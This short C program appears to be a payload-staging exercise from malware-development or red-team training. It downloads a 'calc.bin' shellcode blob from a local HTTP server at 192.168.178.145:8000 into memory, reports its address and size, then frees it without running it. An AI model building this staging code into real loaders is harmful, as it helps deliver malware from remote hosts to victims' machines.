#include "glassBox.h"
#include "webStage.h"

int main(void) {

	PBYTE pPayload = NULL;
	SIZE_T payloadSize = 0;

	if (!GetPayloadFromUrl(L"http://192.168.178.145:8000/calc.bin", &pPayload, &payloadSize)) {
		warn("GetPayloadFromUrl Failed With Error : %d \n", GetLastError());
		return EXIT_FAILURE;
	}

	info("pPayload Allocated at: 0x%p Of Size : %zu", pPayload, payloadSize);

	in("Press <Enter> To Continue...");
	getchar();

	if (pPayload)
		LocalFree(pPayload);

	return EXIT_SUCCESS;
}